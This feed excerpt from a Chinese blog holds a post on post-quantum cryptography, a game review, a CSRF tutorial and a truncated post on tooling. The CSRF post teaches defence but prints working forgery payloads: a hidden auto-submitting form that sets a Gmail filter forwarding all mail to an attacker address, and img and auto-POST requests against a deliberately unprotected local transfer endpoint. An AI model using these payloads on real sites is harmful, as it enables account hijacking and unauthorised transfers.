    <content type="html"><![CDATA[<p>听到“后量子加密算法”这个标题，许多人可能会产生许多疑惑：这和量子计算机有什么关系？后量子加密算法包含哪些内容？本系列将阐述密码学的前沿研究方向：后量子密码学。</p><span id="more"></span><h2 id="序言"><a class="markdownIt-Anchor" href="#序言"></a> 序言</h2><h3 id="什么是后量子加密算法"><a class="markdownIt-Anchor" href="#什么是后量子加密算法"></a> 什么是“后量子加密算法”？</h3><p>听到“后量子加密算法”这个名称，许多人会与“量子计算机”迅速联系在一起。当然，这个直观感受是很对的。但是，“后量子加密算法”并不是运行在量子计算机上的加密算法————毕竟若真如此的话，确实离我们实在是有些遥远了。“后量子加密算法”真正的含义是：在量子计算机上难以被破解的加密算法，也即抗量子计算的加密算法。</p><h3 id="为什么需要新的算法"><a class="markdownIt-Anchor" href="#为什么需要新的算法"></a> 为什么需要新的算法？</h3><p>“为什么需要”这个问题往往是新科技或新技术产生的本质原因：需求决定创造。目前，世界上对于量子计算机的研究发展迅速，导致量子计算时代就快要揭开帷幕。我们需要关注的是，量子计算机在某些计算问题上具备远超电子计算机的计算能力。至于这点，我们可以简单地这么想象：电子计算机使用高低电平来储存信息比特，即对于单个存储单位，其非0即1；而对于量子计算机，情况并非如此：量子计算机中每一位称为“量子比特”。每一个量子比特具有三种状态（严格意义上不止三种，但便于理解，我们姑且认为是三种）：本征态0，本征态1以及量子叠加态（两个本征态的线性组合）。正因为量子叠加态的存在，使得我们在某一个比特上可以存储除了0和1之外的信息。因此，经典比特能够完成的计算一定能够在量子比特上完成，反之则未必。</p><p>量子计算机其实并不如我们想象的那么万能。目前而言，仅有少量的难以在电子计算机上求解的困难问题而能够被量子计算机简单求解。但很不幸，1994年Shor所提出的能够在量子计算机上实现的一种算法可以在多项式时间内有效地解决大整数分解问题（感兴趣可见<a href="https://ieeexplore.ieee.org/document/365700">论文原文</a>），这正是RSA的基础。现代的签名证书广泛地使用RSA。这也揭示了某些问题在量子计算机上强大地优越性。同时，设计基于新的困难问题的抗量子计算加密算法迫在眉睫。</p><h3 id="后量子加密算法"><a class="markdownIt-Anchor" href="#后量子加密算法"></a> 后量子加密算法</h3><p>后量子加密算法中，一般基于以下的数学问题构造：基于编码，基于格，基于多变量，基于哈希等。其中，基于格的后量子密码尤为引人注目。NIST的后量子密码算法征集中，绝大多数也都基于格困难问题构造。本系列试图以尽可能少的数学知识，以通俗浅显的方式介绍基于格的后量子密码学。<strong>当然，这并不意味着能够毫不费力地看懂。学习任何知识的过程都不可能如喝水般轻松。</strong> 系列文章的难度我希望尽可能能够控制在略加思考就能大致理解的程度。</p><p>下一节我们将从格的基本概念入手，对加密算法基于的困难问题的背景知识进行初步的把握。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;听到“后量子加密算法”这个标题，许多人可能会产生许多疑惑：这和量子计算机有什么关系？后量子加密算法包含哪些内容？本系列将阐述密码学的前沿研究方向：后量子密码学。&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="https://blog.snowflake.zone/categories/%E5%AE%89%E5%85%A8/"/>
    
    <category term="密码学" scheme="https://blog.snowflake.zone/categories/%E5%AE%89%E5%85%A8/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="密码学" scheme="https://blog.snowflake.zone/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="后量子" scheme="https://blog.snowflake.zone/tags/%E5%90%8E%E9%87%8F%E5%AD%90/"/>
    
  </entry>
  
  <entry>
    <title>《奥日与萤火意志》(Ori and the Will of Wisps)简评</title>
    <link href="https://blog.snowflake.zone/posts/19/"/>
    <id>https://blog.snowflake.zone/posts/19/</id>
    <published>2023-08-03T16:00:00.000Z</published>
    <updated>2023-08-03T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>一周断断续续通关了奥日 2，简单地对这个游戏做个总结。</p><span id="more"></span><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>奥日 2 发售于三年前，最近也是趁着打折入手，花费了 15 个小时通关了一周目。总的来说奥日 2 是一款很不错的游戏，难度合适，画面、音乐出色。下面对每个部分简单评价一下。</p><h2 id="评价"><a class="markdownIt-Anchor" href="#评价"></a> 评价</h2><h3 id="画面效果"><a class="markdownIt-Anchor" href="#画面效果"></a> 画面效果</h3><p>首先，画面设计绝对没得说，奥日系列一向就是以画面唯美浪漫被大家所熟知的。本文的封面就是奥日 2 游戏封面，大家也可以一起感受一下：</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/019/cover.jpg" alt="游戏封面" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">游戏封面</span></div></div><p>游戏被分为多个场景，每个场景的美术也独具特色。但相同之处在于都将画面的唯美感置于中心位置。</p><div class="tag-plugin swiper fancybox" id="swiper-api" width="max"><div class="swiper-wrapper"><div class="swiper-slide"><img no-lazy src="/assets/019/1.jpg" alt="" /></div><div class="swiper-slide"><img no-lazy src="/assets/019/2.jpg" alt="" /></div><div class="swiper-slide"><img no-lazy src="/assets/019/3.jpg" alt="" /></div><div class="swiper-slide"><img no-lazy src="/assets/019/4.jpg" alt="" /></div></div><div class="swiper-pagination"></div><div class="swiper-button-prev blur"></div><div class="swiper-button-next blur"></div></div><p>但是，对于少部分玩家，可能难以适应这种光效，会有“光污染”的感受，这点还是见仁见智了。</p><p>画面得分：10/10.</p><h3 id="音乐效果"><a class="markdownIt-Anchor" href="#音乐效果"></a> 音乐效果</h3><p>奥日 2 的音乐也是一大特色。主题曲以及主题曲的变奏伴随着整个游戏旅途，或紧张，或感伤，气氛渲染充足又不做作。读者可以播放下面的音乐自行感受。画面与音乐的配合使得这款游戏的视听效果已经十分出众。</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1426940268&auto=1&height=66"></iframe><p>音乐得分：10/10.</p><h3 id="关卡设计"><a class="markdownIt-Anchor" href="#关卡设计"></a> 关卡设计</h3><p>玩游戏主要还是重在游戏体验以及关卡设计上。奥日是一款典型的 2D 平台跳跃游戏。经过奥日 1 的经验，奥日 2 有着及其大量的自动存档点以及很小的死亡惩罚，使得在标准难度下，游戏的难度依然是比较低的。尤其是如果有空洞骑士的体验之后再来游玩奥日，可以说过关还是轻而易举的。</p><p>玩家主要需要围绕着二段跳（后期可以使用三段跳），冲刺以及猛击（与场景中的部分物品互动，可以增加一段冲刺效果）来完成地图探索、BOSS 挑战和解密。不过，BOSS 设计总的来说还有进步空间。奥日对于操作失误的过于宽松的容忍导致即使不躲避 BOSS 的攻击，在中后期依然可以较为简单的通过游戏，因此很容易过关以后连 BOSS 的招式都不知道。</p><p>但是，逃亡是奥日独具特色的玩法之一。在整个游戏流程中，有多段逃亡任务，节奏紧张而刺激。围绕着前面所提到的基础操作，再由背景音乐和画面的双重渲染下，逃亡的整个流程紧凑且畅快。下面是一个较为困难的逃亡场景，读者可以感受一下。</p><iframe src="//player.bilibili.com/player.html?aid=370260080&bvid=BV1vZ4y1x7r3&cid=179368577&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p>如果没有逃亡，奥日的关卡设计其实较为普通。但因为有了独具特色的逃亡关卡，使得奥日也能在大量的平台跳跃游戏中脱颖而出。</p><p>但缺点也是很显然的：庞大的地图和稀少的传送点导致玩家需要在获得新技能后大量跑图去探索以前无法到达的地方，这也是许多玩家诟病的地方。当然相比于第一作需要玩家手动存档，第二作的自动存档和即时传送还是进步了许多的。</p><p>关卡设计得分：8/10.</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>《奥日与萤火意志》有着无与伦比的音效和视觉表现，使得玩家能够在游玩过程中如同欣赏艺术品一般沉浸于游戏所带来的体验中。关卡难度较低，上手成本低使得入门玩家也可以拥有较好的游戏体验和反馈。游戏特色逃生关卡节奏紧凑，操作重复却不令人无聊厌烦。奥日披襟斩棘拯救灵树、拯救挚友的故事也在画面和音乐的推波助澜之下带给人长久的感动。不过，游戏大量的跑图依然会带来较为烦人的体验，不过相比于游戏的优点，这些缺点也无伤大雅。</p><p>综合推荐指数：9.5/10.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一周断断续续通关了奥日 2，简单地对这个游戏做个总结。&lt;/p&gt;</summary>
    
    
    
    <category term="娱乐" scheme="https://blog.snowflake.zone/categories/%E5%A8%B1%E4%B9%90/"/>
    
    <category term="游戏简评" scheme="https://blog.snowflake.zone/categories/%E5%A8%B1%E4%B9%90/%E6%B8%B8%E6%88%8F%E7%AE%80%E8%AF%84/"/>
    
    
    <category term="游戏" scheme="https://blog.snowflake.zone/tags/%E6%B8%B8%E6%88%8F/"/>
    
    <category term="奥日" scheme="https://blog.snowflake.zone/tags/%E5%A5%A5%E6%97%A5/"/>
    
  </entry>
  
  <entry>
    <title>原理与实践：详解跨站请求伪造(CSRF)攻击</title>
    <link href="https://blog.snowflake.zone/posts/18/"/>
    <id>https://blog.snowflake.zone/posts/18/</id>
    <published>2023-05-21T16:00:00.000Z</published>
    <updated>2023-05-21T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>为什么不能点击不明来源的链接？其背后的原理又是如何的？这篇文章，就带你走进一种利用恶意链接发起攻击的方式：跨站请求伪造攻击(CSRF)。</p><span id="more"></span><h2 id="一个例子"><a class="markdownIt-Anchor" href="#一个例子"></a> 一个例子</h2><p>文章的开始，我想用一个例子来给大家一点直观的感受。</p><p>有一天，小明一如既往点开他的邮箱查阅未读邮件，发现了这么一封邮件，上面写着：</p><div class="tag-plugin quot"><p class="content" type="text"><span class="empty"></span><span class="text">甩卖比特币，一个只要998！</span><span class="empty"></span></p></div><p>当然，我们都清楚，这几乎确定是一封钓鱼邮件。但是为了能把故事讲下去，我们只能让小明点开这个链接。小明点开链接后，发现不出意外是一个空白页面。小明关掉了这个页面，不再理会这件事情。</p><p>直到几个月后的某一天，小明收到了域名赎回的邮件。起初他以为是自己忘记续费了，直到对方开出了600美刀的价格，他才发现域名被<strong>转让</strong>了！这时，他回到了那个曾经打开过的空白页面，查看了网页的源代码，发现了如下的字样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">style</span>=<span class="string">&quot;visibility: hidden&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cf2_emc&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cf2_email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker@hakermail.com&quot;</span>/&gt;</span> </span><br><span class="line">    .....</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;irf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;on&quot;</span>/&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nvp_bu_cftb&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Create Filter&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>稍有HTML知识的读者就会发现，这是一张隐藏的form表单。表单内容是向Gmail发送一个请求创建邮件过滤规则，其规则为将收到的所有邮件转发给<code>hacker@hackermail.com</code>。同时，这个页面有一个自动执行的Javascript，其发送的这个隐藏的表单。这样一分析，我们就不难理解小明都经历了什么了。</p><p>这个事情是具有原型的，其为2007年Gmail的CSRF严重漏洞。受害者的经历大家可以点击<a href="https://www.davidairey.com/google-gmail-security-hijack/">这里</a>去阅读。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig1.png" alt="007年Gmail的CSRF严重漏洞" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">007年Gmail的CSRF严重漏洞</span></div></div><p>那么，我们不禁要问，这个攻击为什么能够做到？</p><h2 id="csrf原理"><a class="markdownIt-Anchor" href="#csrf原理"></a> CSRF原理</h2><h3 id="简单介绍"><a class="markdownIt-Anchor" href="#简单介绍"></a> 简单介绍</h3><p>CSRF(Cross-Site Request Forgery)漏洞，即跨站请求伪造漏洞，是一种常见的Web应用漏洞。CSRF是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p><p>这样的定义还是过于抽象了，通俗来讲，就是攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p><p>攻击者是如何盗用身份的？这就不得不提到现代通信协议中的重要一部分：Cookie和Session机制。</p><h3 id="cookie和session"><a class="markdownIt-Anchor" href="#cookie和session"></a> Cookie和Session</h3><p>HTTP协议是一种无状态的协议，对于先后到达的两个请求之间的关系，HTTP并不了解也不关心是否来自于一个用户，它将这两个请求一律当作两个不同的客户端来处理。这样会导致一些麻烦：如果我连续两次访问同一个网站，我是不是还要输入一次密码？或者重新向服务器证明我的身份？Cookie和Session的引入就是为了解决这个问题。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig2.jpg" alt="Cookie和Session示意图" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">Cookie和Session示意图</span></div></div><p>上述流程明确地展示了Cookie和Session的作用：用户访问目标网站时，目标网站会试图将一个小型文本文件写入你的浏览器中，这就是Cookie。当你再次访问同一个网站时，浏览器会自动带上这个Cookie以证明你的合法身份；目标网站也能根据你的Cookie选择不同的Session(一般是数据库中的一部分)为你提供定制化的服务。</p><h3 id="csrf攻击原理一图详解"><a class="markdownIt-Anchor" href="#csrf攻击原理一图详解"></a> CSRF攻击原理一图详解</h3><p>知道了Cookie和Session，那么CSRF的原理就很好解释了。以下以一张图来展示：</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig3.png" alt="一图详解CSRF" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">一图详解CSRF</span></div></div><p>首先，攻击者会提供一个“不怀好意”的界面，等待用户上钩。当受害者访问了这个有害界面时，其利用页面中的恶意代码强制用户向某个具有CSRF漏洞的服务器发送请求。这个请求因为是从受害者端发出的，因此会自动带上受害者的Cookie。服务器接收到这个请求后，认为是合法用户的请求进而执行，使得攻击者的计谋得逞。这就是CSRF的大致原理。</p><h2 id="csrf攻击实例"><a class="markdownIt-Anchor" href="#csrf攻击实例"></a> CSRF攻击实例</h2><div class="tag-plugin colorful note" color="warning"><div class="title">重要提示</div><div class="body"><p>接下来的示例全部在本地进行。如果你也想要以学习为目的尝试CSRF攻击，请在本地建立靶机，而不要试图攻击别人的网站！</p></div></div><h3 id="get型攻击"><a class="markdownIt-Anchor" href="#get型攻击"></a> GET型攻击</h3><p>GET请求是HTTP常用的向服务器发送数据的方式之一，其特点是可以将参数显式地拼接在URL中请求，因此可以用来传递一些短的参数。例如：<code>https://cn.bing.com/search?q=搜索&amp;form=QBRE</code>中：就传递了这么两个参数：<code>q</code>和<code>form</code>。但这样的请求方式安全性很弱，其会被浏览器的历史浏览所记录，并且参数也暴露在URL中。</p><div class="tag-plugin colorful note" color="red"><div class="title">漏洞风险</div><div class="body"><p>接下来的示例中的示例代码请不要在生产环境使用！</p></div></div><p>我们在本地创建一个api来完成转账服务，使用框架为django。其视图函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transfer</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        target = request.GET.get(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line">        amount = request.GET.get(<span class="string">&#x27;amount&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Successfully transferred &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(amount, target))</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Transferred successfully by GET!&quot;</span>)</span><br></pre></td></tr></table></figure><p>上述函数从GET请求中获取两个参数：<code>target</code>和<code>amount</code>，来表示<strong>转账对象</strong>和<strong>转账金额</strong>。发起转账的用户信息从用户发来的Cookie中获取。此时我们只需要使用户点击如下样子的链接：<code>http://127.0.0.1:8000/api/transfer/?target=felix&amp;amount=10000</code>，用户的10000元就被转账到了felix账户上。</p><p>当然，这样的链接很不聪明，因为URL中包含了太多敏感字眼：例如transfer和amount。因此，使用短链接进行伪装是一个很好的想法。更明智一些，我们可以将这个请求放在HTML页面中，例如下面这样的例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8000/api/transfer/?target=felix&amp;amount=10000&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者可以使得用户访问自己的恶意页面时返回包含如上<code>&lt;img&gt;</code>标签的HTML使得自动请求<code>src</code>的资源，进而发出了这个GET请求。从受害者的角度看来，这个页面除了一个加载不出的图片以外，什么也没有。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig4.png" alt="受害者看到的" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">受害者看到的</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig5.png" alt="页面源代码" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">页面源代码</span></div></div><p>当然了，大多数网站都不会用GET请求发送涉及敏感操作的请求。所以这种方式的适用性有限。</p><h3 id="post请求"><a class="markdownIt-Anchor" href="#post请求"></a> POST请求</h3><p>与GET请求相对应的，是POST请求。POST请求也是HTTP协议中向服务器传递数据的一种方式，该请求向服务器提交/发送要被处理的数据。POST请求的特点包括：相比于GET请求安全性高，其数据存在于请求体中，安全要求高时可以加密；请求数据不会被浏览器记录，也不会被缓存；可以传递的数据量比GET请求高。</p><p>这样的请求将发送的数据放在请求体中，如下图所示：</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig6.png" alt="POST请求的负载" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">POST请求的负载</span></div></div><p>攻击POST请求的api接口时相较于GET请求并没有复杂多少，因为我们的目的就是利用受害者的Cookie身份。我们依然利用钓鱼链接诱骗用户上当，这个链接依然可以通过前面说的短链接，或者重定向等方式来伪装。页面也可以设置成为一个自动发送的POST表单，其中包含了我们希望受害者做的操作。</p><p>后端处理POST请求的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transfer</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        target = request.GET.get(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line">        amount = request.GET.get(<span class="string">&#x27;amount&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Successfully transferred &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(amount, target))</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Transferred successfully by GET!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        target = request.POST.get(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line">        amount = request.POST.get(<span class="string">&#x27;amount&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Successfully transferred &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(amount, target))</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Successfully transferred by POST&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;invalid visit&quot;</span>)</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig7.png" alt="恶意页面包含的内容" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">恶意页面包含的内容</span></div></div><p>与小明碰到的情况非常类似，这个页面也自动发送了一个在服务器看来完全合法的表单。这样，POST请求也并没有保证拦截非法请求。那么，CSRF有什么防范措施吗？</p><h2 id="csrf攻击的预防"><a class="markdownIt-Anchor" href="#csrf攻击的预防"></a> CSRF攻击的预防</h2><p>答案是显然的。不论上述哪种攻击方式，他们有一个共同的特点：**CSRF攻击之所以能成功，是因为攻击者可以完全伪造用户的请求。**只要破坏这个条件，CSRF就是很容易预防的。</p><p>常见的防御措施有：验证码、Referer验证、CSRF-token。</p><h3 id="验证码"><a class="markdownIt-Anchor" href="#验证码"></a> 验证码</h3><p>验证码强制用户与网站进行交互，而不能离开交互便获取到所有需要的信息，因此可以用来防范CSRF攻击。但是，验证码的缺点是：其对用户体验的破坏性的。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig8.png" alt="对用户体验的破坏性" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">对用户体验的破坏性</span></div></div><h3 id="referer验证"><a class="markdownIt-Anchor" href="#referer验证"></a> Referer验证</h3><p>Referer是请求头中的一个字段，其包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端可以使用 Referer 请求头识别访问来源。我们发现，伪造的请求大多都来源于攻击者构建的页面，这个信息会被存储在Referer请求头中。后端接收到请求时可以对该字段进行检查，来过滤掉可能是CSRF攻击所伪造的请求。</p><p>我们假设服务器的网址：<code>http://127.0.0.1:8000</code>，而攻击者页面的地址：<code>http://127.0.0.1:80</code>，那么显然：正常请求的来源肯定是前者，而后者发来的请求在正常情况下大概率是不会发生的。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig9.png" alt="Referer字段的不同" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">Referer字段的不同</span></div></div><h3 id="csrf-token"><a class="markdownIt-Anchor" href="#csrf-token"></a> CSRF token</h3><p>CSRF token是服务器后端返回页面时自动生成的字符串，一般是随机字符串与时间戳的加密密文。在用户访问该网站时，服务器会产生一个token交给用户；在提交请求时，前端自动携带这个token发送给后端校验，来判断这个请求是否是用户自愿发送的。在django中，我们可以如下设计表单使其带上CSRF token：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;/api/transfer/&quot;</span>&gt;</span><br><span class="line">    &#123;% csrf_token %&#125; <span class="comment"># csrf token</span></span><br><span class="line">    &lt;p&gt;target: &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;target&quot;</span> name=<span class="string">&quot;target&quot;</span> /&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;amount: &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;amount&quot;</span> name=<span class="string">&quot;amount&quot;</span>/&gt;&lt;/p&gt;</span><br><span class="line">    &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>此时，前端页面可能没有变化：</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig10.png" alt="貌似没有变化的前端页面" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">貌似没有变化的前端页面</span></div></div><p>但事实上，表单中多了一个隐藏的字段，就是这个随机的token。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/018/fig11.png" alt="已经嵌入了一个额外的字段csrf-token" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">已经嵌入了一个额外的字段csrf-token</span></div></div><p>现在，许多的网站都选择通过这种方式来防止CSRF攻击，读者可以查看任意一个可以提交数据的网站的页面源码来看看是否有一个csrf token。</p><h2 id="结束语"><a class="markdownIt-Anchor" href="#结束语"></a> 结束语</h2><p>这篇文章通过原理与实践的方式介绍了Cookie和Session的机制、CSRF攻击的原理以及防范措施。当然更重要的，是每个人都要保护好自己的Cookie。Cookie宛如一张“电子身份证”，向网站证明你的身份。Cookie的私密性是非常重要的，因此，定期清楚浏览器中不使用的Cookie也是一个好的习惯。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;为什么不能点击不明来源的链接？其背后的原理又是如何的？这篇文章，就带你走进一种利用恶意链接发起攻击的方式：跨站请求伪造攻击(CSRF)。&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="https://blog.snowflake.zone/categories/%E5%AE%89%E5%85%A8/"/>
    
    <category term="Web" scheme="https://blog.snowflake.zone/categories/%E5%AE%89%E5%85%A8/Web/"/>
    
    
    <category term="Web安全" scheme="https://blog.snowflake.zone/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Stellar动态友链分组</title>
    <link href="https://blog.snowflake.zone/posts/17/"/>
    <id>https://blog.snowflake.zone/posts/17/</id>
    <published>2022-11-13T13:30:31.000Z</published>
    <updated>2022-11-14T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>我们时常希望博客的友链界面能够对不同的友链分组；stellar的动态友链功能又十分强大，但所有导出的数据都会写入一个文件。这篇文章记录对动态友链生成仓库的改造，使之能够进行友链分类。</p><span id="more"></span><div class="tag-plugin colorful note" color="blue"><div class="title">11月15日更新</div><div class="body"><p>最新版本的动态友联已经支持输出到自定义文件，因此读者继续参考本文时请注意文章的时效性。</p></div></div><div class="tag-plugin colorful note" color="yellow"><div class="body"><p>由于本文对于仓库源码有一定的改动，请先确认你是否确实有这个需求，而后再理性地选择是否魔改。</p></div></div><p>废话我就不多说了，我们直接开始。</p><h1 id="fork动态友链抓取仓库"><a class="markdownIt-Anchor" href="#fork动态友链抓取仓库"></a> fork动态友链抓取仓库</h1><p>首先，你需要fork动态友链抓取仓库，链接如下：</p><div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://github.com/xaoxuu/issues-json-generator" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon"><div class="left"><span class="title">https://github.com/xaoxuu/issues-json-generator</span><span class="cap link footnote">https://github.com/xaoxuu/issues-json-generator</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div><p>根据README内容完成配置。这里我就不多赘述了，需要保证你的workflow能够正确运行并且<code>output</code>分支能看到输出的<code>data.json</code>文件。</p><h1 id="代码修改"><a class="markdownIt-Anchor" href="#代码修改"></a> 代码修改</h1><p>在这个魔改中需要修改两部分内容(均处于<code>main</code>分支下)：<code>config.yml</code>和<code>generator/main.py</code>。这里先给出两者的文件：</p><div class="tag-plugin colorful note" color="blue"><div class="title">提示</div><div class="body"><p>在复制源码前，我建议你看看我都改了什么。这有助于你对代码有宏观的把握，也对程序中可能出现的问题有解决想法。</p></div></div><h2 id="configyml"><a class="markdownIt-Anchor" href="#configyml"></a> config.yml</h2><div class="tag-plugin tabs"id="tab_2"><div class="nav-tabs"><div class="tab active"><a href="#tab_2-1">diff</a></div><div class="tab"><a href="#tab_2-2">源文件</a></div></div><div class="tab-content"><div class="tab-pane active" id="tab_2-1"><figure class="highlight diff"><figcaption><span>config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 